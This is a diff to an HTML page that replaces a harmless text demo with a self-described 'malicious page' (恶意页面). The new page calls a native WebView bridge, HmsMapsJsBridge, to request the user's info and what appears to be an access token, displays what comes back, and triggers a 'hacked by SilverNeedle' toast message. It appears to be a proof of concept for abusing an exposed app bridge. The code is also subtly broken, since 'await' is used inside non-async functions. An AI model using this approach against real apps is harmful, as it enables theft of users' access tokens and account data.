@@ -23,13 +23,21 @@
     </style>
 </head>
 <body>
-    <h1 id="text">这是初始文本。</h1>
-    <button onclick="changeText()">点击我修改文本</button>
-
+    <h1 id="text">恶意页面</h1>
+    <button onclick="getAT()">点击我获取用户AT</button>
+    <button onclick="toast()">点击我发送消息</button>
     <script>
-        function changeText() {
-            document.getElementById("text").innerText = "文本已被修改！";
+        function getAT() {
+            // document.getElementById("text").innerText = "文本已被修改！";
+            let str = "{'type':'getUserInfo', 'msgId':10086}";
+            let ret = await window.HmsMapsJsBridge.postMessage(str);
+            document.getElementById("text").innerText = ret;
         }
+        function toast() {
+            let str = "{'type':'toast', 'msgId':10086, 'data':{'message':'hacked by SilverNeedle😄'}}";
+            let ret = await window.HmsMapsJsBridge.postMessage(str);
+        }
+
     </script>
 </body>
 </html>
